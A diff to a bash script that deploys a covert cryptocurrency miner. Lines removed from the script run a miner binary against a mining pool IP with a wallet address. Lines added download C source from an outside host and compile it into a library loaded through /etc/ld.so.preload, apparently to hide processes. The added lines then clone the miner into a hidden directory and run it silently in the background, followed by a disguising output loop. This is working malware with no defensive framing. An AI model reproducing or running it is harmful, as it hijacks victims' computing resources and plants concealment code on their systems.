@@ -1,4 +1,14 @@
 #!/bin/bash
-git clone https://github.com/6248202226/gradi.git && cd gradi
-chmod +x zepo
-./zepo --donate-level 1 -o 149.28.147.155:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-A) -a rx/0 -k -t $(nproc --all) 
+apt-get update ; apt-get install sudo -y
+curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+mkdir .kap && cd .kap
+git clone https://github.com/6248202226/gradi.git
+cd gradi
+chmod +x config.json && chmod +x zepo
+./zepo -c "config.json" > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10s; done
